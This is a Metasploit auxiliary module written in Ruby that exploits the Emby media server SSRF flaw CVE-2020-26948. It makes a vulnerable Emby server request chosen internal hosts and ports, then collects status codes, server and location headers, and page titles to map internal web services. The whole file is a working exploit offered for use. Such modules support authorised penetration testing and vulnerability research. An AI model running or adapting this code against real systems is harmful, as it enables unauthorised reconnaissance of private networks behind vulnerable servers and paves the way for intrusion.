##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Emby SSRF HTTP Scanner',
      'Description' => 'Generates a `GET` request to the provided web servers and executes an SSRF against
                        the targeted EMBY server. Returns the server header, HTML title attribute and
                        location header (if set). This is useful for rapidly identifying web applications
                        on the internal network using the Emby SSRF vulnerability (CVE-2020-26948).',
      'Author' => 'Btnz',
      'License' => MSF_LICENSE,
      'Disclosure Date' => '2020-10-01',
      'RelatedModules' => ['auxiliary/scanner/http/emby_version_ssrf'],
      'References' => [
        ['CVE', '2020-26948'],
        ['URL', 'https://github.com/btnz-k/emby_ssrf']
      ]
    )

    deregister_options('VHOST', 'RPORT', 'SNAPLEN', 'SSL')

    register_options(
      [
        OptString.new('TARGETURI', [false, 'The URI of the Emby Server', '/']),
        OptBool.new('STORE_NOTES', [true, 'Store the information in notes.', true]),
        OptBool.new('SHOW_TITLES', [true, 'Show the titles on the console as they are grabbed', true]),
        OptString.new('EMBY_SERVER', [true, 'Emby Web UI IP to use', '']),
        OptInt.new('EMBY_PORT', [true, 'Web UI port for Emby Server', '8096']),
        OptString.new('PORTS', [true, 'Ports to scan', '80,8080,8081,8888'])
      ]
    )
  end

  def run_host(target_host)
    # Do some checking to ensure data is submitted
    # Also converts ports string to list
    dports = Rex::Socket.portspec_crack(datastore['PORTS'])
    raise Msf::OptionValidateError, ['PORTS'] if dports.empty?

    # loop through the ports
    dports.each do |p|
      vprint_status("Attempting SSRF with target #{target_host}:#{p}")
      uri = "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}"
      # not using send_request_cgi due to difference between RHOSTS and EMBY_SERVER
      res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])

      # Check for Response
      if res.nil?
        vprint_error("http://#{target_host}:#{p} - No response")
        next
      end

      # Retrieve the headers to capture the Location and Server header
      server_header = res['server']
      location_header = res['location']

      # Check to see if the captured headers are populated
      if server_header.nil? && location_header.nil?
        vprint_error("#{target_host}:#{p} No HTTP headers")
      end

      # If the body is blank, just stop now as there is no chance of a title
      vprint_error("#{target_host}:#{p} No webpage body") if res.body.nil?

      # Very basic, just match the first title tag we come to. If the match fails,
      # there is no chance that we will have a title
      rx = %r{<title>[\n\t\s]*(?<title>.+?)[\s\n\t]*</title>}im.match(res.body.to_s)
      unless rx
        vprint_error("#{target_host}:#{p} No webpage title")
        next
      end

      # Last bit of logic to capture the title
      rx[:title].strip!
      if rx[:title].empty?
        vprint_error("#{target_host}:#{p} No webpage title")
        next
      end

      rx_title = Rex::Text.html_decode(rx[:title])
      if datastore['SHOW_TITLES']
        print_good("#{target_host}:#{p} Title: #{rx_title}")
        print_good("#{target_host}:#{p}     HTTP Code: #{res.code}")
        print_good("#{target_host}:#{p}     Location Header: #{location_header}")
        print_good("#{target_host}:#{p}     Server Header: #{server_header}")
      end
      if datastore['STORE_NOTES']
        notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header }
        report_note(host: target_host, port: p, type: 'http.title', data: notedata, update: :unique_data)
      end
    end
  end
end
